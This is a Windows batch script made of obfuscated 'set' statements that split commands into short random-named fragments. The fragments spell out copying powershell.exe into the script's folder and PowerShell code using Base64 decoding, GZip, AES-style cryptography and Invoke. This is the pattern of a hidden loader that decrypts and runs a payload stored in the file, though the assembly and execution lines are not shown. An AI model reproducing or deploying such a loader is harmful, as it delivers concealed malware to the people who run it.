@echo off
set "tmYQElBpPg=do"
set "xGDHJxdnPk=32"
set "VzscTdOVeY= /"
set "ReXzEMmKtM=st"
set "WKKYvyIwcU= C"
set "UXxSAcEChK=co"
set "lTubikNGVP=s\"
set "tiAnJqDqZv=ow"
set "YrFXDgWVxw=\W"
set "wBhveknywc=nd"
set "pJEFAKRbwF=.e"
set "HkIRWuttUh=Po"
set "XcmjMCihHU=in"
set "vLkTwwtcHT=xe"
set "UMXdcGgNsP=Wi"
set "ssNjmiDhUj=he"
set "hmTkAxlxzc=0\"
set "pWGVRLtOts=we"
set "WFYBggcmAG=y "
set "cPNXEDgfnT=em"
set "azGPleDuBX=:\"
set "PkflzOnWZc=py"
set "PGSbqdFHiR=he"
set "GiKrKXWLpl=po"
set "FGgqNZidub=rS"
set "BVrJVfBlBv=rs"
set "ayhwFWiWmZ=ll"
set "IYUjOKkPty=ws"
set "dldXXBhBTT=we"
set "RhuIQLsZsc=ll"
set "rvvbTbesdW=\v"
set "mqZTOXjwII=1."
set "sVemxzslKb=Sy"
set "abbRzhkxAT= %~dp0"
set "EoLMBBUiGt=cd"
set "PfASjXjjMo=$yFe"
set "KZVpQdrPVK= New"
set "AfXnQBtcBS=[]] "
set "tnWhDGeEWc=gth)"
set "RWEWgpevAx=ateD"
set "qGLdfuvcjV=le  "
set "dCbguIFLYL=Secu"
set "xuwtsMbaYP=Obje"
set "jBhQTiUJIX=3); "
set "LXGPeWYkgz=.Con"
set "OhFQCdTzfw=WrC "
set "GlXPQERDeC=ert]"
set "luAxdPrqKm=ptog"
set "MVJZGVgtyJ=.GZi"
set "CaJIoaGLay=-joi"
set "HSwwxzIgIm=grap"
set "hqHZbJOgBQ=morF"
set "pxxPTVdgDD=();$"
set "LiDGNyTrif=ect "
set "RmRBeyfNhB=n ''"
set "XijpYJuvqr=Obje"
set "osOQvgOtKw=Fina"
set "jiPcNbSVEV=)($J"
set "mztFNVwvXH=V = "
set "hAeipYDFfd=Qg, "
set "pRpKzbStyn=m.IO"
set "GAStsSgWHu=New-"
set "OZNFHCouin=oryS"
set "qyqpFonNda=$PzY"
set "iMWnglGiSW=('%*'"
set "IEnOSevILO=g = "
set "qKrCALpfXN=ion."
set "rYoOpfVZIA=;$Kx"
set "AokHEwwmqd=ck($"
set "QeQYntgCqh=File"
set "CDSgMwroZb=);$m"
set "inHCiGosmK=PxEW"
set "OjnRkDViNu=zYZB"
set "itHSBiJXpX=YSE "
set "ciddkiqfHv=B = "
set "gePvVwuQAM=[IO."
set "lazOLStJtj=$ype"
set "zRrSmNXDJA= = ["
set "mcTLPnFrxr=rofi"
set "XItMqwjsfG==');"
set "nOaWGTMTEx=('da"
set "ScAWdtUPCl=$PzY"
set "AJbdBDhoyn=BC;$"
set "SbZlfokvVK=am;$"
set "APEETaiglZ=, $P"
set "iklIAqmaZW=ypeO"
set "vQkZjADeFe='gni"
set "SmGmKOVmKl='[-1"
set "qQomzwIXAk=pStr"
set "pfLFWjaGyT='[-1"
set "XfkGxDIOtw=onve"
set "qSQCEmFRrW=em.I"
set "UdfHLMQdAT=::('"
set "hthFGFuZkL=;$yF"
set "WNkAAUVsZq=C.Su"
set "xBMERvOFiL== $m"
set "EtuSmPeiRH=($vo"
set "RgITcKQIYI=1] -"
set "dMvemegrht=.Cre"
set "jaGQDHPreA=mory"
set "WBiohVbvvS=; };"
set "FSqgeIYZrA= = $"
set "ejATBMXkis=yste"
set "tNFBBLBktJ=ke($"
set "gmFRWBmvvV=raph"
set "ELJYMOJxEI=null"
set "PzXqxEeRdS=E.En"
set "lsgLbweDIK=B = "
set "ILJieJWkPw=.Key"
set "xDxPnjlBxq=lit("
